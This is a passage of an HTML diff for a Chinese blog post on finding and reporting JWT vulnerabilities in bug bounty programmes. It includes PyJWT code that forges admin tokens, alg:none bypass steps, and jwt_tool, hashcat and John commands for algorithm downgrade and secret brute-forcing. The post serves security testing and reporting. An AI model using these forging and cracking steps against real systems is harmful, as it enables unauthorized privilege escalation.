+<li>若已知密钥（如泄露的​<code>my-secret-key</code>​），用​<code>PyJWT</code>生成篡改后的 Token：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="comment"># 篡改角色为管理员</span></span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">9999999999</span>  <span class="comment"># 永不过期</span></span><br><span class="line">&#125;</span><br><span class="line">secret = <span class="string">&quot;my-secret-key&quot;</span>  <span class="comment"># 已知密钥</span></span><br><span class="line">token = jwt.encode(payload, secret, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用伪造 Token 访问&#x2F;api&#x2F;admin，若返回管理员数据，证明漏洞存在。</li>
+</ul>
+<h2 id="第三步：SRC-提交技巧"><a href="#第三步：SRC-提交技巧" class="headerlink" title="第三步：SRC 提交技巧"></a><strong>第三步：SRC 提交技巧</strong></h2><ul>
+<li><strong>明确漏洞类型：</strong> 标注 “JWT 无签名绕过”“JWT 密钥泄露”“JWT 算法降级”，避免模糊描述；</li>
+<li><strong>提供可复现步骤：</strong> 包含 “获取原始 Token→篡改方法→伪造 Token→验证权限” 的完整流程，附关键命令；</li>
+<li><strong>证明危害：</strong> 提供 “普通用户 Token→伪造管理员 Token→访问后台” 的截图，或 “密钥泄露后伪造 Token” 的日志；</li>
+</ul>
+<p>示例提交模板：</p>
+<ol>
+<li><p>漏洞标题： <strong>【高危】<a target="_blank" rel="noopener" href="http://target.com/api/admin">http://target.com/api/admin</a> 存在JWT无签名绕过漏洞，可伪造管理员Token</strong>；</p>
+</li>
+<li><p>复现步骤：</p>
+<ul>
+<li>登录普通用户，获取 Token：<strong>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9…</strong> ；</li>
+<li>修改 Header 的<strong>alg</strong>为<strong>none</strong>，删除 Signature，篡改 Payload 的<strong>role</strong>为<strong>admin</strong>；</li>
+<li>用伪造 Token 访问 <strong>&#x2F;api&#x2F;admin</strong>，返回管理员列表；</li>
+</ul>
+</li>
+<li><p>证明截图：包含 “原始 Token”“伪造 Token”“管理员接口响应” 的拼接图。</p>
+</li>
+</ol>
+<h1 id="四、JWT-漏洞利用工具链：从检测到伪造"><a href="#四、JWT-漏洞利用工具链：从检测到伪造" class="headerlink" title="四、JWT 漏洞利用工具链：从检测到伪造"></a>四、JWT 漏洞利用工具链：从检测到伪造</h1><p>红队利用 JWT 漏洞的工具需满足 “快速检测、便捷伪造、支持爆破” 的需求，以下是实战中高频使用的工具：</p>
+<h2 id="1-漏洞检测工具"><a href="#1-漏洞检测工具" class="headerlink" title="1.漏洞检测工具"></a>1.漏洞检测工具</h2><h3 id="（1）JWT-tool（全能型-JWT-测试工具）"><a href="#（1）JWT-tool（全能型-JWT-测试工具）" class="headerlink" title="（1）JWT_tool（全能型 JWT 测试工具）"></a><strong>（1）JWT_tool（全能型 JWT 测试工具）</strong></h3><ul>
+<li>核心用途：检测签名绕过、算法降级、密钥爆破、Payload 篡改，支持生成伪造 Token；</li>
+<li>实战命令：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 检测无签名算法（alg: none）</span></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -X a  <span class="comment"># -X a：自动检测所有漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 算法降级攻击（RS256→HS256）</span></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... -X k -pk public.key -alg HS256 -T <span class="string">&quot;&#123;&#x27;role&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 密钥爆破（HS256）</span></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -C -d /usr/share/wordlists/rockyou.txt  <span class="comment"># -C：爆破密钥</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）Burp-Suite-插件（JWT-Editor-JSON-Web-Tokens）"><a href="#（2）Burp-Suite-插件（JWT-Editor-JSON-Web-Tokens）" class="headerlink" title="（2）Burp Suite 插件（JWT Editor + JSON  Web Tokens）"></a>（2）Burp Suite 插件（JWT Editor + JSON  Web Tokens）</h3><ul>
+<li><p>核心用途：拦截 JWT 请求，可视化修改 Header&#x2F;Payload，验证签名有效性；</p>
+</li>
+<li><p>实战操作：</p>
+<ol>
+<li>拦截 JWT 请求，右键选择 “Send to JWT Editor”；</li>
+<li>在 “Header” 标签页修改alg为none，删除 “Signature” 标签页的内容；</li>
+<li>在 “Payload” 标签页修改role为admin，点击 “Sign” 生成伪造 Token；</li>
+<li>发送请求，观察响应是否通过验证。</li>
+</ol>
+</li>
+</ul>
+<h2 id="2-密钥爆破工具"><a href="#2-密钥爆破工具" class="headerlink" title="2.密钥爆破工具"></a>2.密钥爆破工具</h2><h3 id="（1）hashcat（高性能密钥爆破）"><a href="#（1）hashcat（高性能密钥爆破）" class="headerlink" title="（1）hashcat（高性能密钥爆破）"></a>（1）hashcat（高性能密钥爆破）</h3><ul>
+<li>核心用途：爆破 HS256&#x2F;HS384&#x2F;HS512 算法的弱密钥，支持 GPU 加速；</li>
+<li>实战命令：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆破HS256密钥（-m 16500对应JWT HS256）</span></span><br><span class="line">hashcat -m 16500 -a 0 <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ.abc123...&quot;</span> /usr/share/wordlists/rockyou.txt -O  <span class="comment"># -O：优化模式，加速爆破</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）John-the-Ripper（多算法支持）"><a href="#（2）John-the-Ripper（多算法支持）" class="headerlink" title="（2）John the Ripper（多算法支持）"></a>（2）John the Ripper（多算法支持）</h3><ul>
+<li>核心用途：支持 JWT 多种算法的密钥爆破，适合无 GPU 环境；</li>
+<li>实战命令：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将JWT转换为John可识别的格式</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ.abc123...&#x27;</span> &gt; jwt.hash</span><br><span class="line"><span class="comment"># 爆破密钥</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.hash</span><br></pre></td></tr></table></figure>
+
+<p>得到最终可用的token：<br>eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsN119.VTD8Z_CPnNbuJ0JAwvBnckDGaV_2UIEFIqivISgHRZQ</p>
+<p>‍</p>
+<h2 id="3-Token-生成工具"><a href="#3-Token-生成工具" class="headerlink" title="3.Token 生成工具"></a>3.Token 生成工具</h2><h3 id="（1）PyJWT（Python-库，灵活生成-Token）"><a href="#（1）PyJWT（Python-库，灵活生成-Token）" class="headerlink" title="（1）PyJWT（Python 库，灵活生成 Token）"></a>（1）PyJWT（Python 库，灵活生成 Token）</h3><ul>
+<li>核心用途：已知密钥时，生成自定义 Payload 的 JWT，支持多种算法；</li>
+<li>实战：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成HS256算法的管理员Token</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义Payload（管理员角色，有效期7天）</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;999&quot;</span>,  <span class="comment"># 管理员ID</span></span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: datetime.utcnow() + timedelta(days=<span class="number">7</span>)</span><br><span class="line">&#125;</span><br><span class="line">secret_key = <span class="string">&quot;my-secret-key&quot;</span>  <span class="comment"># 已知密钥</span></span><br><span class="line"><span class="comment"># 生成Token</span></span><br><span class="line">token = jwt.encode(payload, secret_key, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;伪造的管理员Token：&quot;</span>, token)</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）jwt-io（在线工具，快速验证）"><a href="#（2）jwt-io（在线工具，快速验证）" class="headerlink" title="（2）jwt.io（在线工具，快速验证）"></a>（2）jwt.io（在线工具，快速验证）</h3><ul>
+<li>核心用途：在线解码 JWT、生成 Token（适合临时测试，不建议处理敏感密钥）；</li>
+<li>使用方法：</li>
+</ul>
+<ol>
+<li>访问<a target="_blank" rel="noopener" href="https://jwt.io/%EF%BC%9B">https://jwt.io/；</a></li>
+<li>在 “Encoded” 框粘贴 JWT，自动解码 Header 和 Payload；</li>
+<li>在 “Algorithm” 选择算法（如 HS256），输入密钥，修改 Payload 后点击 “Sign” 生成伪造 Token。</li>
+</ol>
+<p>‍</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1792319429449"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT"><span class="toc-number">1.</span> <span class="toc-text">JWT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-JWT%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%EF%BC%9A%E4%BB%8E%E7%BB%93%E6%9E%84%E5%88%B0%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91"><span class="toc-number">2.</span> <span class="toc-text">一.JWT核心原理：从结构到认证逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%9A%E4%B8%89%E9%83%A8%E5%88%86-Base64-%E7%BC%96%E7%A0%81%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">JWT 的结构：三部分 Base64 编码拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Header%EF%BC%88%E5%A4%B4%E9%83%A8%EF%BC%89%EF%BC%9A%E6%8C%87%E5%AE%9A%E7%AE%97%E6%B3%95%E4%B8%8E%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">（1）Header（头部）：指定算法与类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89-Payload-%EF%BC%88%E8%BD%BD%E8%8D%B7%EF%BC%89%EF%BC%9A%E5%AD%98%E5%82%A8%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.2.</span> <span class="toc-text">（2） Payload （载荷）：存储用户身份信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Signature%EF%BC%88%E7%AD%BE%E5%90%8D%EF%BC%89%EF%BC%9A%E7%A1%AE%E4%BF%9D-Token-%E6%9C%AA%E8%A2%AB%E7%AF%A1%E6%94%B9"><span class="toc-number">2.1.3.</span> <span class="toc-text">（3）Signature（签名）：确保 Token 未被篡改</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-JWT-%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%8E%9F%E7%90%86%EF%BC%9A%E4%BB%8E%E7%AD%BE%E5%90%8D%E5%88%B0%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="toc-number">3.</span> <span class="toc-text">二.JWT 漏洞类型与原理：从签名到逻辑缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%AF%86%E9%92%A5%E4%BC%AA%E9%80%A0-Token%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">1.签名绕过漏洞（无需密钥伪造 Token）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%97%A0%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%EF%BC%88alg-%E2%80%9Cnone%E2%80%9D%EF%BC%89"><span class="toc-number">3.1.1.</span> <span class="toc-text">（1）无签名算法（alg: “none”）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%AE%97%E6%B3%95%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB%EF%BC%88%E5%A6%82-RS256%E2%86%92HS256%EF%BC%89"><span class="toc-number">3.1.2.</span> <span class="toc-text">（2）算法降级攻击（如 RS256→HS256）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2-%E5%BC%B1%E5%AF%86%E9%92%A5"><span class="toc-number">3.2.</span> <span class="toc-text">2.密钥泄露 &#x2F; 弱密钥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.1.</span> <span class="toc-text">（1）密钥硬编码 &#x2F; 配置文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%BC%B1%E5%AF%86%E9%92%A5%EF%BC%88%E5%8F%AF%E7%88%86%E7%A0%B4%EF%BC%89"><span class="toc-number">3.2.2.</span> <span class="toc-text">（2）弱密钥（可爆破）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Payload-%E7%AF%A1%E6%94%B9%EF%BC%88%E7%AD%BE%E5%90%8D%E6%9C%89%E6%95%88%E4%BD%86%E5%86%85%E5%AE%B9%E5%8F%AF%E7%AF%A1%E6%94%B9%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">3.Payload 篡改（签名有效但内容可篡改）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E8%A7%92%E8%89%B2%E7%AF%A1%E6%94%B9%EF%BC%88%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E2%86%92%E7%AE%A1%E7%90%86%E5%91%98%EF%BC%89"><span class="toc-number">3.3.1.</span> <span class="toc-text">（1）角色篡改（普通用户→管理员）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%9C%89%E6%95%88%E6%9C%9F%E7%AF%A1%E6%94%B9%EF%BC%88Token-%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%9C%9F%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">（2）有效期篡改（Token 永不过期）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%B8%AD%E5%8D%B1%EF%BC%9AToken-%E5%A4%8D%E7%94%A8-%E6%9C%AA%E9%94%80%E6%AF%81"><span class="toc-number">3.4.</span> <span class="toc-text">4. 中危：Token 复用 &#x2F; 未销毁</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81SRC-%E4%B8%AD%E5%BF%AB%E9%80%9F%E6%8C%96%E6%8E%98-JWT-%E6%BC%8F%E6%B4%9E%EF%BC%9A%E5%AE%9E%E6%88%98%E6%B5%81%E7%A8%8B%E4%B8%8E%E6%8A%80%E5%B7%A7"><span class="toc-number">4.</span> <span class="toc-text">三、SRC 中快速挖掘 JWT 漏洞：实战流程与技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%AF%86%E5%88%AB%E4%BD%BF%E7%94%A8-JWT-%E7%9A%84%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%8E%A5%E5%8F%A3"><span class="toc-number">4.1.</span> <span class="toc-text">第一步：识别使用 JWT 的资产与接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%8C%89%E6%BC%8F%E6%B4%9E%E4%BC%98%E5%85%88%E7%BA%A7%E6%B5%8B%E8%AF%95-JWT"><span class="toc-number">4.2.</span> <span class="toc-text">第二步：按漏洞优先级测试 JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E4%BC%98%E5%85%88%E6%B5%8B%E8%AF%95%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87%EF%BC%88%E6%9C%80%E5%BF%AB%E9%AA%8C%E8%AF%81%EF%BC%8C1-2-%E5%88%86%E9%92%9F-%E7%9B%AE%E6%A0%87%EF%BC%89"><span class="toc-number">4.2.1.</span> <span class="toc-text">（1）优先测试签名绕过（最快验证，1-2 分钟 &#x2F; 目标）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%AC%A1%E4%BC%98%E5%85%88%E6%B5%8B%E8%AF%95%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2-%E5%BC%B1%E5%AF%86%E9%92%A5"><span class="toc-number">4.2.2.</span> <span class="toc-text">（2）次优先测试密钥泄露 &#x2F; 弱密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%9C%80%E5%90%8E%E6%B5%8B%E8%AF%95-Payload-%E7%AF%A1%E6%94%B9%EF%BC%88%E9%9C%80%E5%B7%B2%E7%9F%A5%E5%AF%86%E9%92%A5%EF%BC%89"><span class="toc-number">4.2.3.</span> <span class="toc-text">（3）最后测试 Payload 篡改（需已知密钥）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9ASRC-%E6%8F%90%E4%BA%A4%E6%8A%80%E5%B7%A7"><span class="toc-number">4.3.</span> <span class="toc-text">第三步：SRC 提交技巧</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81JWT-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E9%93%BE%EF%BC%9A%E4%BB%8E%E6%A3%80%E6%B5%8B%E5%88%B0%E4%BC%AA%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">四、JWT 漏洞利用工具链：从检测到伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">1.漏洞检测工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89JWT-tool%EF%BC%88%E5%85%A8%E8%83%BD%E5%9E%8B-JWT-%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number">5.1.1.</span> <span class="toc-text">（1）JWT_tool（全能型 JWT 测试工具）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Burp-Suite-%E6%8F%92%E4%BB%B6%EF%BC%88JWT-Editor-JSON-Web-Tokens%EF%BC%89"><span class="toc-number">5.1.2.</span> <span class="toc-text">（2）Burp Suite 插件（JWT Editor + JSON  Web Tokens）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7"><span class="toc-number">5.2.</span> <span class="toc-text">2.密钥爆破工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89hashcat%EF%BC%88%E9%AB%98%E6%80%A7%E8%83%BD%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4%EF%BC%89"><span class="toc-number">5.2.1.</span> <span class="toc-text">（1）hashcat（高性能密钥爆破）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89John-the-Ripper%EF%BC%88%E5%A4%9A%E7%AE%97%E6%B3%95%E6%94%AF%E6%8C%81%EF%BC%89"><span class="toc-number">5.2.2.</span> <span class="toc-text">（2）John the Ripper（多算法支持）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Token-%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7"><span class="toc-number">5.3.</span> <span class="toc-text">3.Token 生成工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89PyJWT%EF%BC%88Python-%E5%BA%93%EF%BC%8C%E7%81%B5%E6%B4%BB%E7%94%9F%E6%88%90-Token%EF%BC%89"><span class="toc-number">5.3.1.</span> <span class="toc-text">（1）PyJWT（Python 库，灵活生成 Token）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89jwt-io%EF%BC%88%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="toc-number">5.3.2.</span> <span class="toc-text">（2）jwt.io（在线工具，快速验证）</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="Search" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
